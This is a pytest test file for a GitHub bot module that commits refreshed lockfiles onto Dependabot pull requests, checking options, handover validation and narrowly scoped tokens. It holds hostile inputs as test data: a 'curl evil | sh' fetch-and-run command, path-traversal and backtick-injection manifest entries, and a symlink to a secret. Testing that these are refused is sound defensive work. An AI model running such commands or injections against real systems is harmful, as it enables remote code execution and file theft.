# SPDX-FileCopyrightText: 2026 Lukas Koerber
# SPDX-License-Identifier: Apache-2.0

"""The ``lockfiles`` module: options, handover checks, gates and the commit it makes."""

from __future__ import annotations

from dataclasses import replace
from pathlib import Path

import pytest
from pydantic import ValidationError

from lktec_bot.application.gate import Gate
from lktec_bot.application.modules import _handover
from lktec_bot.application.modules.lockfiles import service
from lktec_bot.application.modules.lockfiles.ecosystems import ecosystem_of, within
from lktec_bot.application.modules.lockfiles.options import (
    DEFAULT_COMMIT_MESSAGE,
    LockfilesOptions,
)
from lktec_bot.application.modules.lockfiles.service import (
    Decision,
    HandoverError,
    Lockfiles,
    read_manifest,
)
from lktec_bot.application.verbs import handlers
from lktec_bot.domain.policy import POLICY_PATH
from lktec_bot.ports.github_api import PullRequest
from tests.fakes import FakeApiFactory, FakeRepository, FakeTokenProvider

HEAD = "0123456789abcdef0123456789abcdef01234567"
BRANCH = "dependabot/uv/ruff-0.13.1"
ENABLED = "version: 1\nmodules:\n  lockfiles:\n    enabled: true\n"


def policy(options: str = "") -> str:
    return ENABLED + "".join(f"    {line}\n" for line in options.splitlines())


def dependabot_pr(**changes: object) -> PullRequest:
    base = PullRequest(
        number=7,
        html_url="https://github.com/acme/widgets/pull/7",
        state="open",
        draft=False,
        head_sha=HEAD,
        author_login="dependabot[bot]",
        head_ref=BRANCH,
        head_repo="acme/widgets",
    )
    return replace(base, **changes)  # type: ignore[arg-type]


class Setup:
    def __init__(self, *, policy_text: str = ENABLED, pull_request: PullRequest | None = None):
        self.state = FakeRepository(
            pull_requests={7: pull_request or dependabot_pr()},
            branches={BRANCH: HEAD},
            ref_files={(HEAD, "uv.lock"): "old lock\n"},
        )
        self.tokens = FakeTokenProvider()
        self.factory = FakeApiFactory({POLICY_PATH: policy_text}, self.state)
        self.gate = Gate(self.tokens, self.factory, handlers())
        self.lockfiles = Lockfiles(self.gate, "acme", "widgets")

    def permissions(self) -> list[dict[str, str]]:
        return [request[2] for request in self.tokens.requests]


def handover(root: Path, files: dict[str, bytes], manifest: list[str] | None = None) -> Path:
    for path, content in files.items():
        target = root / "files" / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(content)
    lines = list(files) if manifest is None else manifest
    (root / "manifest.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")
    return root


# -- ecosystems and options -----------------------------------------------------------------


def test_ecosystem_of_goes_by_the_file_name_only() -> None:
    assert ecosystem_of("uv.lock") == "uv"
    assert ecosystem_of("src/App/packages.lock.json") == "dotnet"
    assert ecosystem_of("package-lock.json") is None
    assert ecosystem_of("uv.lock.bak") is None


def test_within_matches_the_path_or_a_directory_prefix() -> None:
    assert within("a/uv.lock", "a")
    assert within("a/uv.lock", "a/uv.lock")
    assert not within("ab/uv.lock", "a")


def test_options_default_to_auto_detect() -> None:
    options = LockfilesOptions.model_validate({})

    assert options.ecosystems == []
    assert options.paths == []
    assert options.commit_message == DEFAULT_COMMIT_MESSAGE
    assert DEFAULT_COMMIT_MESSAGE == "chore(deps): refresh lockfiles after Dependabot bump"


def test_options_accept_the_documented_keys() -> None:
    options = LockfilesOptions.model_validate(
        {
            "ecosystems": ["uv", "dotnet"],
            "paths": ["src", "uv.lock"],
            "commit-message": "x #{number}",
        }
    )

    assert options.headline(7) == "x #7"


@pytest.mark.parametrize(
    ("raw", "message"),
    [
        ({"ecosystems": ["npm"]}, "unknown ecosystem npm"),
        ({"ecosystems": ["uv", "uv"]}, "listed twice"),
        ({"paths": ["../x"]}, "'..' segment"),
        ({"paths": [".github/workflows"]}, "workflows"),
        ({"commit-message": " "}, "must not be empty"),
        ({"commit-message": "a\nb"}, "single line"),
        ({"commit-message": "x" * 201}, "at most 200"),
        ({"typo": 1}, "Extra inputs"),
    ],
)
def test_options_reject_bad_values(raw: dict[str, object], message: str) -> None:
    with pytest.raises(ValidationError, match=message):
        LockfilesOptions.model_validate(raw)


# -- the handover ---------------------------------------------------------------------------


def test_read_manifest_lists_each_known_lockfile_once(tmp_path: Path) -> None:
    (tmp_path / "manifest.txt").write_text(
        "uv.lock\n\n  src/App/packages.lock.json \nuv.lock\n", encoding="utf-8"
    )

    assert read_manifest(tmp_path) == ["uv.lock", "src/App/packages.lock.json"]


@pytest.mark.parametrize(
    ("line", "reason"),
    [
        ("package-lock.json", "not the name of a known lock file"),
        ("evil.sh", "not the name of a known lock file"),
        ("../uv.lock", "'..' segment"),
        ("/etc/uv.lock", "absolute"),
        (".github/workflows/uv.lock", "workflows"),
        ("a=b/uv.lock", "characters outside"),
        ("a`b/uv.lock", "characters outside"),
    ],
)
def test_read_manifest_refuses_anything_outside_the_known_names(
    tmp_path: Path, line: str, reason: str
) -> None:
    (tmp_path / "manifest.txt").write_text(f"uv.lock\n{line}\n", encoding="utf-8")

    with pytest.raises(HandoverError, match="refusing the handover") as excinfo:
        read_manifest(tmp_path)

    assert reason in str(excinfo.value)


def test_read_manifest_needs_a_readable_manifest(tmp_path: Path) -> None:
    with pytest.raises(HandoverError, match=r"cannot read manifest\.txt"):
        read_manifest(tmp_path)


def test_local_file_must_exist_and_be_a_plain_file(tmp_path: Path) -> None:
    (tmp_path / "files" / "dir").mkdir(parents=True)

    with pytest.raises(HandoverError, match="is missing"):
        service.local_file(tmp_path, "uv.lock")
    with pytest.raises(HandoverError, match="not a plain file"):
        service.local_file(tmp_path, "dir")


def test_local_file_refuses_a_symlink_out_of_the_directory(tmp_path: Path) -> None:
    secret = tmp_path / "secret.txt"
    secret.write_text("token", encoding="utf-8")
    (tmp_path / "files").mkdir()
    try:
        (tmp_path / "files" / "uv.lock").symlink_to(secret)
    except OSError:
        pytest.skip("symlinks are not available here")

    with pytest.raises(HandoverError, match="not a plain file"):
        service.local_file(tmp_path, "uv.lock")


def test_local_file_refuses_a_file_over_the_size_cap(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    handover(tmp_path, {"uv.lock": b"12345678"})
    monkeypatch.setattr(_handover, "MAX_FILE_BYTES", 4)

    with pytest.raises(HandoverError, match="larger than"):
        service.local_file(tmp_path, "uv.lock")


# -- commit ---------------------------------------------------------------------------------


def test_a_changed_lockfile_is_committed_onto_the_pull_request_branch(tmp_path: Path) -> None:
    setup = Setup()
    changed = handover(tmp_path, {"uv.lock": b"new lock\n"})

    outcome = setup.lockfiles.commit(7, changed, HEAD)

    assert outcome.decision is Decision.COMMITTED
    assert outcome.exit_code == 0
    assert outcome.result == "ok"
    assert outcome.reason.endswith(": uv.lock")
    assert outcome.url and "/commit/" in outcome.url
    branch, headline, body, expected, additions, deletions = setup.state.commits[0]
    assert branch == BRANCH
    assert headline == "chore(deps): refresh lockfiles after Dependabot bump"
    assert "- uv.lock" in body
    assert expected == HEAD
    assert additions == {"uv.lock": b"new lock\n"}
    assert deletions == []
    assert setup.state.log == [f"commit {BRANCH}", "comment #7"]
    # policy, read, policy, commit, policy, comment: each token exactly as narrow as its job.
    assert setup.permissions() == [
        {"contents": "read"},
        {"contents": "read", "pull_requests": "read"},
        {"contents": "read"},
        {"contents": "write"},
        {"contents": "read"},
        {"pull_requests": "write"},
    ]
    assert all(token.revoked for token in setup.tokens.minted)
    assert "`uv.lock`" in setup.state.created_comments[0][1]


def test_an_unchanged_lockfile_is_nothing_to_commit(tmp_path: Path) -> None:
    setup = Setup()
    changed = handover(tmp_path, {"uv.lock": b"old lock\n"})

    outcome = setup.lockfiles.commit(7, changed)

    assert outcome.decision is Decision.UNCHANGED
    assert outcome.exit_code == 0
    assert outcome.reason.startswith("nothing to commit")
    assert setup.state.commits == []
    assert setup.state.log == []


def test_only_the_files_that_differ_are_committed(tmp_path: Path) -> None:
    setup = Setup()
    setup.state.ref_files[(HEAD, "sub/packages.lock.json")] = "{}\n"
    changed = handover(tmp_path, {"uv.lock": b"old lock\n", "sub/packages.lock.json": b"{1}\n"})

    outcome = setup.lockfiles.commit(7, changed)

    assert outcome.decision is Decision.COMMITTED
    assert list(setup.state.commits[0][4]) == ["sub/packages.lock.json"]


def test_a_lockfile_the_head_does_not_have_yet_counts_as_changed(tmp_path: Path) -> None:
    setup = Setup()
    changed = handover(tmp_path, {"new/uv.lock": b"x"})

    outcome = setup.lockfiles.commit(7, changed)

    assert outcome.decision is Decision.COMMITTED
    assert list(setup.state.commits[0][4]) == ["new/uv.lock"]


def test_a_list_from_the_first_job_cannot_add_a_file_it_did_not_hand_over(tmp_path: Path) -> None:
    setup = Setup()
    changed = handover(tmp_path, {"uv.lock": b"new\n"}, manifest=["uv.lock", "other/uv.lock"])

    outcome = setup.lockfiles.commit(7, changed)

    assert outcome.decision is Decision.ERROR
    assert "other/uv.lock is missing" in outcome.reason
    assert setup.tokens.minted == []


def test_an_unknown_file_name_refuses_the_whole_handover_before_any_token(tmp_path: Path) -> None:
    setup = Setup()
    changed = handover(tmp_path, {"uv.lock": b"new\n", "run.sh": b"curl evil | sh"})

    outcome = setup.lockfiles.commit(7, changed)

    assert outcome.decision is Decision.ERROR
    assert outcome.exit_code == 1
    assert "'run.sh': not the name of a known lock file" in outcome.reason
    assert setup.tokens.minted == []
    assert setup.state.commits == []


@pytest.mark.parametrize(
    "overrides",
    [
        {"author_login": "someone"},
        {"author_login": "dependabot-preview[bot]"},
        {"author_login": "Dependabot[bot]"},
        {"draft": True},
        {"state": "closed"},
        {"head_repo": "fork/widgets"},
        {"head_repo": ""},
        {"head_ref": ""},
    ],
)
def test_only_open_non_draft_dependabot_pull_requests_of_this_repository(
    tmp_path: Path, overrides: dict[str, object]
) -> None:
    setup = Setup(pull_request=dependabot_pr(**overrides))
    changed = handover(tmp_path, {"uv.lock": b"new\n"})

    outcome = setup.lockfiles.commit(7, changed)

    assert outcome.decision is Decision.SKIPPED
    assert outcome.exit_code == 0
    assert setup.state.commits == []
    assert len(setup.tokens.minted) == 2  # the policy and the read; no write token


def test_a_pull_request_that_moved_on_is_skipped(tmp_path: Path) -> None:
    setup = Setup()
    changed = handover(tmp_path, {"uv.lock": b"new\n"})

    outcome = setup.lockfiles.commit(7, changed, "f" * 40)

    assert outcome.decision is Decision.SKIPPED
    assert "moved on from ffffffffffff to 0123456789ab" in outcome.reason
    assert setup.state.commits == []


def test_the_ecosystems_option_leaves_other_lockfiles_out(tmp_path: Path) -> None:
    setup = Setup(policy_text=policy("ecosystems: [dotnet]"))
    changed = handover(tmp_path, {"uv.lock": b"new\n"})

    outcome = setup.lockfiles.commit(7, changed)

    assert outcome.decision is Decision.UNCHANGED
    assert "left out by the options: uv.lock" in outcome.reason
    assert setup.state.commits == []


def test_the_paths_option_restricts_to_files_and_directories(tmp_path: Path) -> None:
    setup = Setup(policy_text=policy("paths: [services]"))
    changed = handover(
        tmp_path,
        {"uv.lock": b"new\n", "services/api/uv.lock": b"a\n", "servicesx/uv.lock": b"b\n"},
    )

    outcome = setup.lockfiles.commit(7, changed)

    assert outcome.decision is Decision.COMMITTED
    assert list(setup.state.commits[0][4]) == ["services/api/uv.lock"]


def test_the_commit_message_option_names_the_pull_request(tmp_path: Path) -> None:
    setup = Setup(policy_text=policy('commit-message: "chore: lock #{number}"'))
    changed = handover(tmp_path, {"uv.lock": b"new\n"})

    setup.lockfiles.commit(7, changed)

    assert setup.state.commits[0][1] == "chore: lock #7"


def test_a_repository_without_the_module_enabled_is_denied(tmp_path: Path) -> None:
    changed = handover(tmp_path, {"uv.lock": b"new\n"})

    off = Setup(policy_text="version: 1\nmodules:\n  lockfiles:\n    enabled: false\n")
    other = Setup(policy_text="version: 1\nmodules:\n  ping:\n    enabled: true\n")
    typo = Setup(policy_text=policy("ecosystem: [uv]"))

    for setup in (off, other, typo):
        outcome = setup.lockfiles.commit(7, changed)
        assert outcome.decision is Decision.DENIED
        assert outcome.exit_code == 3
        assert outcome.result == "denied"
        assert setup.state.commits == []


def test_a_failing_commit_is_an_error_with_the_step_named(tmp_path: Path) -> None:
    setup = Setup()
    setup.state.branches.clear()
    changed = handover(tmp_path, {"uv.lock": b"new\n"})

    outcome = setup.lockfiles.commit(7, changed)

    assert outcome.decision is Decision.ERROR
    assert outcome.reason == f"commit: branch {BRANCH!r} does not exist"
    assert setup.state.created_comments == []


def test_an_unknown_pull_request_is_an_error(tmp_path: Path) -> None:
    setup = Setup()
    changed = handover(tmp_path, {"uv.lock": b"new\n"})

    outcome = setup.lockfiles.commit(99, changed)

    assert outcome.decision is Decision.ERROR
    assert "lockfiles could not read" in outcome.reason


def test_a_failing_comment_is_a_warning_not_the_outcome(tmp_path: Path) -> None:
    setup = Setup()
    # The sixth token is the comment's; a broader one than asked for makes the gate refuse it.
    setup.tokens.permissions_by_mint[5] = {
        "metadata": "read",
        "pull_requests": "write",
        "issues": "write",
    }
    changed = handover(tmp_path, {"uv.lock": b"new\n"})

    outcome = setup.lockfiles.commit(7, changed)

    assert outcome.decision is Decision.COMMITTED
    assert any("the comment failed" in warning for warning in outcome.warnings)
    assert len(setup.state.commits) == 1


def test_a_lockfile_that_vanishes_before_the_comparison_is_an_error(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    setup = Setup()
    changed = handover(tmp_path, {"uv.lock": b"new\n"})
    monkeypatch.setattr(service, "local_file", lambda directory, path: directory / "gone")

    outcome = setup.lockfiles.commit(7, changed)

    assert outcome.decision is Decision.ERROR
    assert "cannot read a lock file" in outcome.reason


def test_the_markdown_summary_escapes_the_reason() -> None:
    outcome = service.CommitOutcome(
        7, Decision.COMMITTED, "a_b", "https://x.test/c", ("careful *now*",)
    )

    text = outcome.to_markdown("acme/widgets")

    assert text.startswith("**COMMITTED** `lockfiles commit` #7 on `acme/widgets`: a\\_b")
    assert "<https://x.test/c>" in text
    assert "Warning: careful \\*now\\*" in text
